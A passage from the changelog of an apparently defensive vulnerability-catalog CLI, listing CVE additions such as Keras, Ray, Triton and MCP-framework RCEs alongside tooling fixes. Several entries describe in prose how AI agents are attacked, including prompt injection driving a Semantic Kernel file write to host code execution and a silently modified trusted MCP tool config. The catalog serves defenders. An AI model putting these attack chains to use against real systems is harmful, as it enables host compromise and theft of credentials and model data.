CVE catalog — Keras model-deserialization RCE (the canonical "untrusted model artifact is executable code" supply-chain risk). **CVE-2025-1550** (CWE-94, NIST CVSS 9.8) — Keras's `.keras` format parser runs arbitrary Python via `importlib` at load time, with no Lambda layer or custom object required and triggered simply by loading (not calling) the model; fixed in 3.8.0, which introduced `safe_mode`. **CVE-2025-8747** (CWE-502, NIST CVSS 7.8) — that `safe_mode` mitigation is bypassable through 3.10.0: `Model.load_model` still executes code from a crafted archive via arguments to built-in modules even with `safe_mode` enabled, i.e. the first fix was incomplete. Both map MITRE ATLAS AML.T0010 / AML.T0011 / AML.T0011.000 (ML supply chain compromise / unsafe AI artifacts) and ATT&CK T1204 / T1059 / T1195.002, and their shared zero-day lesson (NEW-CTRL-091) requires treating model artifacts as untrusted code — provenance, safe formats like safetensors, sandboxed loading — and not relying on `safe_mode` alone. CVE count 344 → 346.

## 0.13.82 — 2026-05-25

CVE catalog — NVIDIA Container Toolkit GPU container escape. Adds the two Wiz-disclosed escapes in the container runtime that underpins essentially all containerized GPU/AI workloads. **CVE-2024-0132** (CWE-367, NIST CVSS 8.3 / NVIDIA 9.0) — a time-of-check/time-of-use race lets a crafted container image escape to the host; fixed in Container Toolkit 1.16.2. **CVE-2025-23266** (NVIDIAScape, CWE-426, CVSS 9.0) — an untrusted search path in container-initialization hooks lets a crafted container load attacker code with elevated host permissions; patch per NVIDIA advisory a_id/5659. Both map ATT&CK T1610/T1611 (deploy container / escape to host) and carry maximal blast radius because a single escape on a shared GPU host crosses the tenant boundary and exposes co-tenant models, data, and credentials. Their shared zero-day lesson (NEW-CTRL-090) treats the GPU container runtime as a patch-prioritized AI-pipeline isolation boundary, not an assumed-safe layer. CVE count 342 → 344.

## 0.13.81 — 2026-05-25

CVE catalog — Open WebUI code-injection RCEs. Adds two remote code execution flaws in Open WebUI, a widely deployed self-hosted AI chat front end. **CVE-2026-0766** (CWE-94, ZDI CVSS 8.8) — the `load_tool_module_by_id` function runs an unvalidated user-supplied string as Python, so an authenticated user achieves RCE on the host. **CVE-2025-64496** (CWE-95/501/829, NIST CVSS 8.0, fixed 0.6.35) — with the Direct Connections feature enabled and a user lured to a malicious external model server, that server injects JavaScript via server-sent events, leading to token theft, account takeover, and with extended permissions RCE. Both carry CWE + ATT&CK T1190/T1059 mappings, global-first framework gaps, and behavioral IoCs; their shared zero-day lesson (NEW-CTRL-089) requires an AI application never to turn user-supplied strings or external-model-server content into executable code. CVE count 340 → 342.

## 0.13.80 — 2026-05-25

CVE catalog — ShadowRay (CVE-2023-48022). Adds Anyscale Ray's unauthenticated Job Submission / Dashboard API remote code execution, the landmark case for prioritizing on real-world exploitation rather than CVSS or KEV alone. NVD marks the CVE disputed — the vendor frames the open Job API as intended for trusted networks — so it carries no code patch and is not on the CISA KEV catalog. Yet it is exploited at scale: Oligo's ShadowRay 2.0 campaign turned roughly 230,000 internet-exposed Ray clusters into crypto-mining botnets and exfiltrated model weights and cloud credentials. It therefore scores RWEP 68 (high) on confirmed active exploitation plus broad blast radius with no patch credit. The entry maps real MITRE ATLAS techniques (AML.T0049 / T0034 / T0035 / T0025) and ATT&CK T1190 / T1059 / T1496, and its zero-day lesson names the "controlled network is a security control" theater pattern, with a control requiring the AI compute control plane to authenticate every caller (Ray token auth, no untrusted-network exposure). Mitigation is configuration, not a patch. CVE count 339 → 340.

## 0.13.79 — 2026-05-25

CVE catalog — NVIDIA Triton Inference Server authentication bypass. Adds the two CWE-288 authentication-bypass CVEs from NVIDIA's May 2026 Triton bulletin: **CVE-2026-24207** and **CVE-2026-24206**, both NIST CVSS 9.8 and reachable unauthenticated over the network against one of the most widely deployed AI inference servers. A successful bypass reaches Triton's model control plane (model load/unload, repository management) without credentials. Fixed in r26.03. NVD enriched CVE-2026-24206 to 9.8 while NVIDIA scored it 7.3 — the entry stores the NVD primary and records the dispute. Their shared zero-day lesson adds a control requiring inference-server authentication to be proven complete across every request path, not assumed from the primary API. CVE count 337 → 339.

## 0.13.78 — 2026-05-25

CVE catalog — ShadowMQ code-reuse family: adds the four AI-inference-engine CVEs from Oligo Security's ShadowMQ research, where one insecure deserialization-over-ZeroMQ primitive (CWE-502) spread across projects by copy-paste code reuse. **CVE-2025-23254** (NVIDIA TensorRT-LLM, NIST CVSS 8.8) — Python executor deserializes untrusted data over its ZeroMQ socket; fixed in 0.18.2. **CVE-2025-30165** (vLLM, NIST CVSS 8.0) — legacy V0 engine deserializes over ZeroMQ in multi-node deployments; no code patch shipped, the V0 engine is off by default since 0.8.0, so it scores higher (RWEP 46) than its patched siblings. **CVE-2024-50050** (Meta Llama Stack, NIST CVSS 6.3, originally scored 9.3 by the disclosing researchers) — the seed of the family, fixed by migrating socket serialization to JSON. **CVE-2025-60455** (Modular Max Server, NIST CVSS 8.4) — deserialization reachable with the experimental KVCache agent enabled; fixed in 25.6.0. All four converge on one control: AI inference engines must use a safe serializer, authenticate socket peers, and isolate the channel — applied across every engine in the estate, since the flaw propagated by reuse. CVE count 333 → 337.

## 0.13.77 — 2026-05-25

CVE catalog — two current additions. **CVE-2026-9082** (Drupal core, SA-CORE-2026-004, CWE-89, NIST CVSS 9.8) is an unauthenticated SQL injection in the database abstraction layer reachable via JSON:API on PostgreSQL-backed sites; CISA added it to the KEV catalog on 2026-05-22 with a 2026-05-27 remediation due date, so it scores RWEP P1 (78) on confirmed exploitation. Fixed in the SA-CORE-2026-004 releases (10.4.10 / 10.5.10 / 10.6.9 / 11.1.10 / 11.2.12 / 11.3.10). Its zero-day lesson adds a control requiring parameterization to be verified at the database abstraction layer — not assumed from application-layer input validation or a perimeter WAF. **CVE-2026-26015** (DocsGPT, CWE-77, NIST CVSS 9.8 / GitHub 10.0) completes the MCP command-injection family: a crafted payload bypasses the MCP validation step to run shell commands without authentication; fixed in 0.16.0. Both carry CWE + ATT&CK mappings, global-first framework gaps, and behavioral IoCs. CVE count 331 → 333.

## 0.13.76 — 2026-05-25

CVE catalog — MCP command-injection family expansion: adds five more verified entries from the 2026 MCP supply-chain advisory, all variations of the same root cause where an AI framework hands caller-supplied command/args to its MCP transport and executes them. **CVE-2026-40933** (FlowiseAI Flowise, CWE-78, NIST CVSS 9.9) — an authenticated user bypasses Custom-MCP command sanitization by pairing an allow-listed binary (npx) with execution flags; fixed in 3.1.0. **CVE-2026-30625** (Upsonic, CWE-77, NIST CVSS 9.8) — MCP task creation allow-lists npm/npx whose argument flags re-enable arbitrary command execution; 0.72.0 adds a warning, not a confirmed fix. **CVE-2026-30617** (Langchain-Chatchat, CWE-77, NIST CVSS 8.6) — an exposed MCP management interface lets a caller configure a malicious stdio command. **CVE-2026-30624** (Agent Zero, CWE-77, NIST CVSS 8.6) — MCP server configurations execute without adequate validation. **CVE-2026-30616** (Jaaz, CWE-77, NIST CVSS 7.3) — MCP stdio command-execution handling runs configured commands unsanitized. Each carries CWE + ATT&CK T1190/T1059 mappings, global-first framework gaps, behavioral IoCs, and RWEP scoring; all map to the MCP-transport command-governance controls already established for this class. CVE count 326 → 331.

## 0.13.75 — 2026-05-25

CVE catalog — MCP stdio transport RCE class: adds two more from the 2026 MCP supply-chain advisory, both where the MCP stdio transport runs caller-supplied commands. **CVE-2026-22252** (LibreChat, CWE-285, NIST CVSS 9.9) — the MCP stdio transport accepts arbitrary commands without authorization, so any authenticated user executes shell commands as root inside the container via one API request; fixed in 0.8.2-rc2. **CVE-2026-22688** (Tencent WeKnora, CWE-77, NIST CVSS 8.8) — authenticated users inject `stdio_config.command/args` into MCP settings, causing the server to spawn attacker-supplied subprocesses; fixed in 0.2.5. Both not KEV, RWEP P3 (30 each). Each carries CWE + ATT&CK T1190/T1059 mappings, global-first framework gaps, behavioral IoCs, and a zero-day lesson with a new control (NEW-CTRL-083/084) requiring the MCP stdio transport to authorize callers and validate/neutralize the commands it is handed rather than treating ordinary user auth as an execution boundary. CVE count 324 → 326.

## 0.13.74 — 2026-05-25

CVE catalog — MCP agent-tool trust: adds **CVE-2025-54136** (Check Point Research's "MCPoison"). Cursor trusts an MCP server entry when the user first approves it but never re-validates the `.cursor/mcp.json` entry on later edits — so an attacker who modifies that already-trusted entry (via a shared repository the victim pulls, or local access) gets their command (CWE-78) executed silently and persistently on every project open. This is AI-agent tool poisoning (ATLAS **AML.T0110**): a previously-approved tool mutated into a malicious one with no fresh consent. CVSS 8.8; fixed in Cursor 1.3; not KEV. RWEP P3 (30, per `lib/scoring.js`). CWE-78/829 + ATLAS AML.T0110/T0104 + ATT&CK T1059/T1195, global-first framework gaps, behavioral IoCs, and a zero-day lesson whose new control (NEW-CTRL-082) requires re-validating AI-agent tool configurations on change rather than trusting them indefinitely after first approval. CVE count 323 → 324.

Internal: the `doctor --signatures --shipped-tarball` round-trip test (npm pack + extract + Ed25519 verify) was intermittently exceeding its 30s cap on the macOS CI runner; it now uses a generous timeout to stop the spurious failure.

## 0.13.73 — 2026-05-25

CVE catalog — MCP toolchain: adds **CVE-2025-49596**, the remote code execution in Anthropic's official MCP Inspector. The Inspector client and proxy have no authentication between them, so an unauthenticated request that reaches the browser-reachable proxy (loopback / 0.0.0.0) launches MCP commands over stdio — a malicious web page a developer visits drives it cross-origin (the 0.0.0.0-day / DNS-rebinding class), yielding RCE on the developer's machine. CWE-306; GitHub CNA CVSS v4.0 9.4 (NVD has not assessed v3.1; the catalog records a conservative v3.1 estimate of 8.3); fixed in `@modelcontextprotocol/inspector` 0.14.1. The framework-gap notes name the real exposure: MCP — the connective tissue of the agent ecosystem — concentrates RCE risk in its toolchain, which sits outside the managed vulnerability program on developer workstations. RWEP P3 (30): not KEV, no confirmed in-the-wild exploitation, patched at disclosure. CWE-306/352/346 + ATT&CK T1190/T1059, global-first framework gaps, behavioral IoCs, and a zero-day lesson whose new control (NEW-CTRL-081) requires locally-bound AI/MCP dev services to authenticate and origin-validate rather than trust loopback reachability. CVE count 322 → 323.

## 0.13.72 — 2026-05-25

CVE catalog — AI-framework threat intel: adds **CVE-2026-25592**, the Microsoft Semantic Kernel prompt-injection-to-RCE (CVSS 9.9 critical; Microsoft-disclosed 2026-05-07; fixed in Microsoft.SemanticKernel.Plugins.Core 1.71.0). A path traversal (CWE-22) in the `SessionsPythonPlugin` allows arbitrary file write; because the plugin runs inside a tool-wired agent, an injected prompt (ATLAS AML.T0051) drives the write to host code execution — a single prompt was shown launching calc.exe on the agent host. This is the catalog's core thesis made concrete: once an agent can reach a file-writing or code-running tool, prompt injection is a remote-code-execution primitive, not a content-safety nuisance. The RWEP score is deliberately P3 (30) despite the 9.9 CVSS — it is not KEV-listed, has no confirmed in-the-wild exploitation, and shipped with a patch (Hard Rule #3: real-world-exploit priority over CVSS). The entry carries CWE-22/94 + ATLAS AML.T0051 + ATT&CK T1059/T1203 mappings, global-first framework gaps including the prompt-injection access-control gap, behavioral IoCs, and a zero-day lesson whose new control (NEW-CTRL-080) requires sandboxing the AI agent's tool-execution boundary. CVE count 321 → 322.

## 0.13.71 — 2026-05-25

CVE catalog currency: closes the last of the 2026-05-20 CISA KEV batch by adding the five legacy CVEs CISA re-listed for renewed exploitation against unpatched / end-of-life systems — CVE-2008-4250 (Windows Server-service RPC RCE, MS08-067 / Conficker), CVE-2009-1537 (DirectShow QuickTime parsing RCE), CVE-2009-3459 (Adobe Acrobat/Reader heap overflow), CVE-2010-0249 (Internet Explorer use-after-free, Operation Aurora), and CVE-2010-0806 (Internet Explorer iepeers use-after-free). Each is KEV-listed 2026-05-20, due 2026-06-03, with patches long available — the re-listing is a legacy-exploitation-resurgence signal, and the framework-gap notes call out that the real exposure is the patch-deployment gap on assets that have fallen out of the managed vulnerability program. Added as enrichment-pending drafts (RWEP P1 70, CWE + ATT&CK mappings, reverse references propagated) matching the catalog's auto-imported KEV-intake convention. With these, the catalog is current to the latest published CISA KEV as of today. CVE count 316 → 321.

## 0.13.70 — 2026-05-24

CVE catalog currency: adds **CVE-2026-45498**, the actively-exploited Microsoft Defender remote denial of service (CVSS 7.5 — network, unauthenticated; CISA KEV 2026-05-20, due 2026-06-03), companion to CVE-2026-41091 in the same Defender advisory. Uncontrolled resource consumption (CWE-400) lets a remote attacker crash or hang Defender, removing the host's AV/EDR coverage — a defense-impairment primitive (ATT&CK T1562.001) that enables follow-on intrusion. (Early press reported CVSS 4.0; NVD's authoritative score is 7.5.) Fixed in Defender antimalware platform 4.18.26040.7 (auto-update, no reboot). The entry carries RWEP scoring (P2, 45 via lib/scoring.js), CWE-400 and ATT&CK T1562.001/T1499 mappings, global-first framework-gap declarations, behavioral IoCs, and a zero-day lesson whose new control (NEW-CTRL-079) makes loss of AV/EDR availability a monitored security event. Postdates the catalog's prior bulk KEV intake (KEV catalog 2026.05.15).

## 0.13.69 — 2026-05-24

CVE catalog currency: adds **CVE-2026-34926**, the actively-exploited Trend Micro Apex One directory traversal (CVSS 6.7; CISA KEV 2026-05-21, due 2026-06-04). A relative path traversal (CWE-23) on the on-premise management server lets an attacker who already holds server admin credentials modify a key table and inject malicious code that the server deploys to every managed agent — a fleet-wide push through the security tool's own trusted deployment channel (Scope:Changed). Fixed in Apex One on-premise 14.0.0.17079 / SaaS 14.0.20731. The entry carries RWEP scoring (P2, 52, computed via lib/scoring.js — PR:H/AC:H gate it below an unauthenticated RCE), CWE-23/22 and ATT&CK T1072/T1083 mappings, global-first framework-gap declarations, behavioral IoCs, and a zero-day lesson whose new control (NEW-CTRL-078) makes the endpoint-management deployment channel an integrity-monitored control plane. Postdates the catalog's prior bulk KEV intake (KEV catalog 2026.05.15).

## 0.13.68 — 2026-05-24

CVE catalog currency: adds **CVE-2026-41091**, the actively-exploited Microsoft Defender link-following local privilege escalation (CVSS 7.8; CISA KEV 2026-05-20, due 2026-06-03). The Malware Protection Engine runs as SYSTEM and improperly resolves links before accessing files (CWE-59), so a local low-privileged attacker who plants a symlink/junction can elevate to SYSTEM — the AV/EDR agent itself is the privileged confused deputy. Fixed in engine build 1.1.26040.8 (auto-update, no reboot); managed environments that pin or delay engine updates are the exposed population. The entry carries full RWEP scoring (P2, 55), CWE-59/269 and ATT&CK T1068 mappings, global-first framework-gap declarations, behavioral IoCs, and a matching zero-day lesson whose new control requirement (NEW-CTRL-077) makes the security agent's own engine-build currency an audited target. Postdates the catalog's prior bulk KEV intake (KEV catalog 2026.05.15).

## 0.13.67 — 2026-05-24

CVE catalog currency: adds **CVE-2025-34291**, the actively-exploited Langflow account-takeover → RCE chain (CVSS 8.8; CISA KEV 2026-05-21; in-the-wild since 2026-01-23). Langflow is a widely deployed open-source AI agent / LLM workflow platform, so this is a direct AI-tooling supply-chain exposure: overly-permissive CORS plus a CSRF-unprotected, SameSite=None token-refresh endpoint lets a malicious page a logged-in user visits steal a token pair and reach the by-design code-execution endpoint. Affects Langflow ≤ 1.6.9; the 1.7 default configuration is protected. The entry carries the full RWEP scoring (P1, score 80), CWE-346/352/942 and ATT&CK T1190/T1539/T1059 mappings, framework-gap declarations, and a matching zero-day lesson; reverse references propagate to the CWE, framework-gap, and ATT&CK catalogs. The CVE postdates the catalog's prior bulk KEV intake (KEV catalog 2026.05.15).

## 0.13.66 — 2026-05-24

RFC reference currency. The `draft-ietf-tls-hybrid-design` entry no longer claims status-synchronization with `draft-ietf-tls-ecdhe-mlkem` — the two have diverged. Hybrid-design has been IESG-approved (draft-16) for publication as an Informational RFC and sits in the RFC Editor queue (no number assigned yet); ecdhe-mlkem remains an active Standards-Track draft. Both are referenced by pqc-first as the post-quantum TLS 1.3 migration path.

## 0.13.65 — 2026-05-24

Standards refresh: the MITRE D3FEND and CWE pins are brought current. D3FEND moves from v1.0.0 (June 2024) to v1.3.0 (December 2025) and CWE to 4.20 (April 2026) across the catalog `_meta`, operator docs, skill bodies, and the catalog-summary index. A breaking-change audit against both releases found no renamed or deprecated identifiers among the referenced techniques and weaknesses — D3FEND v1.0→v1.3 is additive, and CWE 4.16→4.20 deprecated nothing — so no skill mapping changed. Also corrected stale catalog counts in the architecture and context docs (CWE 55→171, D3FEND 28→468) and a skill that still cited D3FEND v0.10. A new guard fails the build if any D3FEND or CWE version mention diverges from the catalog pin.

## 0.13.64 — 2026-05-24

Audit-tooling and metadata consistency. The jurisdiction count now has a single source of truth — it is computed from the framework registry (35: every non-metadata entry, including the international / multi-jurisdiction standards scope) rather than restated by hand in the catalog summary and the cross-skill audit, which had diverged to 34. The researcher routing table gained entries for four skills it previously could not reach: `sector-telecom`, `ransomware-response`, `cloud-iam-incident`, and `idp-incident-response`. The per-skill `forward_watch` and `last_threat_review` fields in the shipped manifest are now synchronized from each skill's frontmatter — 40 stale cached values were corrected, including a forecast note that still dated an ATLAS release to the wrong month — and a guard now fails the build if the manifest cache drifts from frontmatter again. The defensive-countermeasure-mapping skill cites the current MITRE Center for Threat-Informed Defense ATT&CK Mappings crosswalk version (v16.1) and notes that it lags the live ATT&CK v19.0 matrix.

## 0.13.63 — 2026-05-24

Metadata accuracy corrections. Five references still cited MITRE ATLAS v5.1.0 — a catalog descriptor and four control-gap / TTP cross-walk notes — while the shipped catalog tracks v5.6.0. The catalog-summary index and one skill's forecast note dated ATLAS v5.6.0 to February 2026; its release date is May 2026 (2026-05-08). The package description counted 10 intelligence catalogs when 11 ship. The researcher skill described 37 downstream skills (itself the 38th); the library ships 42 (41 downstream).

## 0.13.62 — 2026-05-24

Threat-framework version pins are now consistent across the full surface. The remaining skills and the source registry cite MITRE ATT&CK v19.0 (April 2026); `attack-surface-pentest` and `skill-update-loop` still described the superseded v17 matrix, and `sources/index.json` pointed callers at v17 / 2025-06-25. The same registry's ATLAS pointer is corrected to v5.6.0 (May 2026) — it had drifted to v5.1.0 while every other surface moved on. A new guard refuses any operator-facing reference to an ATT&CK version older than the catalog pin, while permitting forward-looking references so forward-watch entries naming the next release cycle stay intact.

### Bugs

- **`attack-surface-pentest` and `skill-update-loop` cited ATT&CK v17** in their TTP-mapping tables and source-tracking rows while the catalog pin (`data/attack-techniques.json._meta.attack_version`) is v19.0. The version operators read in the skill body now matches the version the engine resolves against.
- **`sources/index.json` pinned ATT&CK at v17 / 2025-06-25 and ATLAS at v5.1.0 / 2025-11-01** — the machine-readable "current version" pointers consumers read to learn which framework revision the catalog tracks. Both now match the catalog: ATT&CK v19.0 / 2026-04-28, ATLAS v5.6.0 / 2026-05-08, with the ATLAS update cadence corrected to monthly.

### Internal

- Added an ATT&CK-version drift guard mirroring the existing ATLAS guard. It is stale-only: a reference older than the pinned version fails the suite; an equal-or-newer reference (how forward-watch records the next release) passes. The source-registry version pointers are asserted against the catalog pins so they cannot silently diverge again.

## 0.13.61 — 2026-05-22

Documentation and skill-content drift fixes. `package.json` description, SBOM metadata, and the operator-queryable catalog summary now report the correct 35-jurisdiction count. Eight skills correct their MITRE ATLAS release date (May 2026, not February 2026); three skills bump their ATT&CK pin to v19.0 to match `data/attack-techniques.json._meta.attack_version` and the AGENTS.md Hard Rule #12 pin. `refresh --check-advisories` help text now enumerates all 15 advisory feeds the runtime polls. The agents/ directory roster drops a broken link to a non-existent `framework-analyst.md` and folds its responsibility into `threat-researcher`.

### Bugs

- **`package.json.description` and `sbom.cdx.json` reported "34 jurisdictions"** while every other surface (README badge, README body, ARCHITECTURE.md, CONTEXT.md) reported 35 and `data/global-frameworks.json` actually ships 35. The npm registry blurb — the first discovery-path operators see — was wrong by one. Bumped to 35 across both, plus `scripts/builders/catalog-summaries.js` and the regenerated `data/_indexes/catalog-summaries.json` which downstream AI consumers query for catalog introspection.
- **Eight skills described MITRE ATLAS v5.6.0 as released "February 2026" (or `2026-02-06`)** when the actual release date is `2026-05-08` (May 2026), as pinned in AGENTS.md Hard Rule #12 and `data/atlas-ttps.json._meta.atlas_release_date`. Audit traceability — "which TTP catalog were we using on May 1?" — requires the date to be consistent across the shipped surface. Fixed in compliance-theater, framework-gap-analysis, incident-response-playbook, policy-exception-gen, mlops-security (×2), rag-pipeline-security, ransomware-response, and skill-update-loop (×2).
- **Three skills referenced ATT&CK v17 (2025-06-25) and AGENTS.md "rule #8"** — both stale. Hard Rule #8 is compliance-theater detection, not version pinning; the version-pinning rule is #12. The pinned ATT&CK version per AGENTS.md and `data/attack-techniques.json._meta.attack_version` is v19.0 (April 2026), which split Defense Evasion into Stealth (TA0005) and Defense Impairment (TA0112). Skills now cite the correct rule number and the current pinned version. Affects incident-response-playbook and ransomware-response.
- **`refresh --check-advisories` help text enumerated 12 venues** while the prose around it (and the runtime in `lib/source-advisories.js`) polls 15. The three omissions — BleepingComputer security, The Hacker News, and the Nightmare-Eclipse GitHub tracker — are now listed inline so the count and the enumeration agree.
- **`agents/README.md` listed a `framework-analyst.md` role that has no file on disk** — the roster, workflow diagram, and parallelization section all referenced a fifth agent that ships as a 404. The threat-researcher role already covers framework amendments; its description and trigger list now reflect that, and the broken row + diagram node are removed.

## 0.13.60 — 2026-05-22

Final tranche of audit cycle 3 polish. `doctor` surfaces the local version; `--collectors` distinguishes policy-skipped from actually-missing collectors; `ask` confidence penalizes ties.

### Features

- **`doctor` surfaces `local_version`** at the top of the JSON envelope + in the text header. Operators see "which version am I running?" alongside "is my install healthy?" without invoking `exceptd version` separately. Opt-in `--registry-check` augments with the published comparison; `local_version` alone is offline-clean.
- **`doctor --collectors` adds `unexplained_missing_collectors`** — the set difference of `without_collector` and `policy_skips`. Previously these were identical-by-coincidence; a future regression that lost an active collector or a policy-skipped playbook that gained one would have gone unnoticed. The new field surfaces the operator-actionable gaps directly.
- **`ask` confidence is penalized by tie spread.** A 5-way tie at the top score no longer reports the same confidence as a single clear winner. `confidence_factors` surfaces `base` (raw score / token count) + `tie_count` so consumers can introspect the math. Tied scores also break alphabetically only as a last resort — direct id-match between the question and a playbook id now outranks alphabetical accident.

## 0.13.59 — 2026-05-22

Air-gap mode honored by `--upstream-check` and the `collect` envelope. `doctor` subchecks surface freshness timestamps + walk-cap markers. `--collectors` text matches its JSON.

### Bugs

- **`run --upstream-check --air-gap` was making the registry call anyway.** The upstream-check helper had no air-gap awareness, and the run path didn't gate the call. The refusal now lives at the central upstream-check dispatch so any future caller inherits it; the result envelope carries `upstream_check.air_gap_blocked: true` and `source: "air-gap"` so consumers see the refusal happened.
- **`doctor --ai-config` walked unbounded** — 48k+ entries under `~/.claude/` (conversation logs, cache, plugin tarballs) before finishing. The walk now caps at 4 depth + 5000 files and skips known-noisy subdir names (`node_modules`, `.git`, `.cache`, `logs`, `sessions`, `conversations`, `history`, `tmp`, `cache`). When the cap fires, `walk_truncated: true` and `walk_caps: { max_depth, max_files }` surface so operators see the bound.
- **`doctor --ai-config` text mode still said "manual ACL review noted for any sensitive files found"** on Windows even though the runtime ACL audit lands real findings via `icacls`. The placeholder dated to the original POSIX-only implementation; replaced with a description that matches the actual check.
- **`doctor --collectors` text mode was a strict subset of JSON** — the count of policy-skipped playbooks was visible but the names were `--json`-only. Text now enumerates the first 5 names + a `+N more` indicator so terminal operators see the same actionable information.

### Features

- **`doctor --currency`** surfaces `oldest_last_threat_review`, `newest_last_threat_review`, `max_days_since_review`, and `checked_at` so operators can answer "is my skill catalog stale?" without parsing the per-skill report.
- **`doctor --rfcs`** surfaces `index_last_modified` + `index_age_days` from the RFC index mtime so operators can answer "is the offline RFC catalog fresh?" without running a separate refresh.
- **`collect` envelope** surfaces `air_gap_mode` at the top of the result so downstream `run --evidence -` and AI consumers see the collection-time mode propagating. Collectors themselves don't currently make network calls; the marker flags the collection context for future collector additions.

## 0.13.58 — 2026-05-22

Air-gap mode now blocks every refresh source (not just GHSA/OSV). `doctor` help text catches up with runtime flag set, surfaces a fix status when nothing to remediate, and refuses unknown flags. `ask` stops returning false-positive substring matches and learns identity / phishing / SSO / famous-attack vocabulary.

### Bugs

- **`refresh --air-gap` was a partial guarantee.** GHSA + OSV honored `ctx.airGap` at the source-module level. `kev`, `epss`, `nvd`, `rfc`, and `pins` fell through to their live-network branches when neither `--from-fixture` nor `--from-cache` was wired up — operators got a banner promising no egress while CISA KEV updates were being applied to the catalog. The air-gap guard now lives at the central source-dispatch (`runOne` in `lib/refresh-external.js`) so the guarantee holds uniformly across every source. Sources with a `fixtures.<name>` or `cacheDir` offline path still run normally.
- **`exceptd doctor --help` advertised 6 flags but the runtime accepted 10.** `--collectors`, `--ai-config`, `--exit-codes`, and `--shipped-tarball` were dispatchable but undiscoverable. The help block now enumerates the full set, with one-paragraph descriptions of what each surface checks. `--exit-codes` is now operator-discoverable as the canonical EXIT_CODES contract dump.
- **`doctor --cves` breakdown arithmetic** silently dropped `BUG-*` and any non-CVE/non-MAL prefix entries from the named totals. `312 entries (301 CVE + 8 MAL)` is now `312 entries (3 BUG + 301 CVE + 8 MAL)` — exact sum. Output adds a structured `by_prefix` map so the breakdown is data-driven against the live catalog instead of hardcoded against two prefixes (same regression class as the v0.13.6 MAL fix, now generalized).
- **`doctor --fix` silently no-op'd when nothing was wrong.** Operators couldn't distinguish "we tried and were already healthy" from "we tried and failed silently." The summary now carries `fix_status: "already_present"` + `fix_skipped_reason` on a healthy install. Existing `fix_applied` / `fix_attempted` / `fix_partial` states unchanged.
- **`doctor` accepted unknown flags as no-ops** instead of refusing. `doctor --singatures` (typo), `doctor --data` (renamed-out flag), `doctor --bogus-flag-xyz` all ran a full default scan and exited 0. Refusal is now structured: ok:false + `unknown_flags[]` with did-you-mean candidates + `known_flags[]` listing every accepted flag. Non-zero exit.
- **`ask` substring matching produced stopword false positives.** `"the"` substring-hit `"authentication"` in the haystack, so any query containing a stopword inflated scores. The pure-stopword query `"the the the the"` routed confidently to ai-api. Fix: tokenize the haystack with the same splitter as the question and match by whole-token Set membership instead of `String.includes`. Plus a stopword filter applied after synonym expansion to drop common English words that would otherwise dilute scoring.

### Features

- **`run` / `ai-run` / `ci` envelopes surface `air_gap_mode` at the top.** Stdout-parsing consumers can detect that air-gap was active without descending into `phases.govern`. Mirrors the existing result-hoist pattern (`verdict`, `rwep_score`, `evidence_completeness`, `attestation_path`).
- **`ask` synonym map grew to cover identity / phishing / SSO / BEC / famous-attack vocabulary.** New keys: `phish*`, `sso`, `oauth`, `saml`, `okta`, `entra`, `bec`, `deepfake`, `left-pad`, `event-stream`, `shai-hulud`, `agentic`, `rogue`, `credential theft`, `developer laptop`. Queries like `"I think we got phished"` now top-route to identity-sso-compromise; `"left-pad style attack"` to library-author; `"credential theft from developer laptop"` to secrets (with cred-stores in top 3).

## 0.13.57 — 2026-05-22

`attest list` populates the signed field. README + verb help document the ai-run JSONL event grammar. `--block-on-jurisdiction-clock` clarifies pending-vs-started semantics.

### Bugs

- **`attest list --json` reports `signed: true|false`** for every attestation by reading the .sig sidecar (Ed25519 + `signature_base64` → signed; `algorithm: "unsigned"` → unsigned). Previously the field was `undefined`, forcing operators to `attest verify` each session individually to learn its signing state.

### Features

- **README + verb help document the `ai-run` JSONL event grammar.** The canonical stdin event shape (`{ "event": "evidence", "payload": { precondition_checks, observations, verdict } }`) plus the phase emission order are now in the README's CLI command reference. The doc also flags the two-shapes-don't-mix rule: if `signal_overrides` is present, the runner takes the nested shape and ignores `observations`/`verdict`. Previously the contract was discoverable only at runtime via the `await_evidence` event's `submission_shape.note` field.
- **`--block-on-jurisdiction-clock` help text clarifies pending-vs-started semantics.** Most playbooks declare `clock_starts: "detect_confirmed"`. The clock stays `pending_clock_start_event` until two things align: (a) the submission's verdict classifies as `detected`, AND (b) the operator passes `--ack` (records `operator_consent.explicit = true`). Alternatively, the submission can stamp `clock_started_at_detect_confirmed: "<ISO>"` directly in the signals. Without one of those paths the clocks stay pending and the flag is a no-op. The help text now documents the exact contract instead of pointing at a `verdict.detect_confirmed` field the runner never consumed.

## 0.13.56 — 2026-05-22

`attest diff <sid>` (without `--against`) emits the v0.11+ envelope and surfaces granular drift.

### Bugs

- **`attest diff <session-id>` (no `--against`) used to fall through to `cmdReattest`**, which emitted the legacy v0.10.x `{verb: "reattest", status, prior_evidence_hash, replay_evidence_hash}` envelope — missing the documented `a_session` / `b_session` / `artifact_diff` / `signal_override_diff` fields. The fall-through ALSO replayed the run against the prior attestation's evidence (heavyweight; semantically different from a pure compare). Now: the no-`--against` path explicitly finds the most-recent prior attestation for the same playbook (via `findLatestAttestation({ playbookId, excludeSessionId })`) and emits the same v0.11+ envelope as the `--against` path. Pure compare; no replay.
- **`exceptd ci --required <pb> --all`** (or `--required <pb> --scope <type>`) now refuses as ambiguous instead of silently running `--required` and dropping the conflicting flag. Same refusal shape as the existing positional + flag refusal.

### Features

- **`attest diff <sid>` on a playbook with no prior attestation** returns a structured `{ status: "no-prior", a_session, a_evidence_hash, message }` envelope instead of erroring out. Operators get a clear "this becomes the baseline" signal.

## 0.13.55 — 2026-05-22

`ci --scope code` no longer halts at preflight on judgement-shaped playbooks. `--required` refuses combination with `--all` / `--scope` as ambiguous.

### Bugs

- **`exceptd ci --scope code` exited 4 BLOCKED out-of-the-box** because the scope filter swept in 3 playbooks whose halt-preconditions require operator-attested evidence the CI runner cannot infer (`ai-discovered-cve-triage` wants `agent_has_vulnerability_feed_access`, `post-quantum-migration` wants `operator_ownership_attested`, `supply-chain-recovery` wants `incident-confirmed`). The canonical CI-gate entry point the README documents was broken. `--scope code` / `--all` / scope-autodetect now default-exclude 9 incident / governance / migration playbooks; operators who genuinely want them pass `--include-judgement-shaped`. `framework` stays included (analyze-only, warn-precondition).
- **`exceptd ci --required <pb> --all`** (or `--required <pb> --scope <type>`) used to silently run `--required` and drop the conflicting flag. Now refuses as ambiguous — same shape as the existing positional+flag refusal: `ci: --required cannot be combined with --all / --scope. Pick one selector...`

### Features

- **`--include-judgement-shaped` opt-in flag** on `ci` and `run`. Operators who do want the policy-skipped set in their scope expansion can opt in explicitly; the default excludes them.

## 0.13.54 — 2026-05-21

